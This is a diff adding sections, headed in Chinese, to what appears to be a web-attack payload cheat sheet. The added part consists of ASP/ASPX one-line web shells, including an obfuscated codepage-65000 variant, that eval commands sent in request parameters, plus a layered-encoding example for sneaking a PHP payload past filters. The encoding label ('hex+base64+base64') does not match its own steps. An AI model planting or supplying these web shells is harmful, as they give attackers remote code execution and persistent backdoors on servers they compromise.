@@ -101,3 +101,35 @@ curl -F "file=@/path/to/malicious.txt" http://example.com/upload
 
 
 ```
+
+
+# ASP/ASPX  代码执行
+
+```
+<%ExecuteGlobal request("chopper")%>
+<%dy=request("c")%><%Eval(dy)%> 
+<%if request ("c")<>""then session("c")=request("c"):end if:if session("c")<>"" then execute session("c")%> 
+
+<%@codepage=65000%>
+<%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t("#")%>
+
+
+aspx
+
+<%@ Page Language="Jscript"%><%eval(Request.Item["xindong"],"unsafe");%>
+
+
+```
+
+# 多层编码 自动解码三层
+```
+hex+base64+base64
+原始字符串: phpinfo();  
+-> 706870696e666f28293b
+-> NzA2ODcwNjk2ZTY2NmYyODI5M2I= 
+-> 4e7a41324f4463774e6a6b325a5459324e6d59794f4449354d32493d
+
+最终的payload: 4e7a41324f4463774e6a6b325a5459324e6d59794f4449354d32493d
+
+
+```
